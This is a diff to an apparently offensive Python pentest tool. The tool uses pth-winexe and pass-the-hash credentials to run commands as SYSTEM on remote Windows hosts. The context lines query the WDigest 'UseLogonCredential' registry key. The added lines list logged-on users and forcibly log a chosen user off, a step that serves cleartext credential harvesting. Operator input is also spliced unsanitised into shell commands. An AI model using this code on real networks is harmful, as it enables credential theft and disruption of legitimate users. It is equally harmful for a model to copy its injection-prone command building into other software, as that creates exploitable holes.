@@ -1596,6 +1596,21 @@ if edq_wdigest!='n':
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
+				response = raw_input("[+]Do you wish to log a user off? Y/N (N): ")
+				if response in yesanswers:	
+					print colored("[+]Querying logged on users:",'green')
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					print proc.communicate()[0]
+					response = raw_input("[+]Enter the ID of the user you wish to log off: ")
+					
+					if response !="":
+						print colored("[+]Attempting to log off user ID "+response,'green')
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C logoff "+response+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						print proc.communicate()[0]
+						print colored("[+]Querying logged on users:",'green')
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						print proc.communicate()[0]
+
 				sys.exit()	
 	
 			elif edq_wdigest=='q':
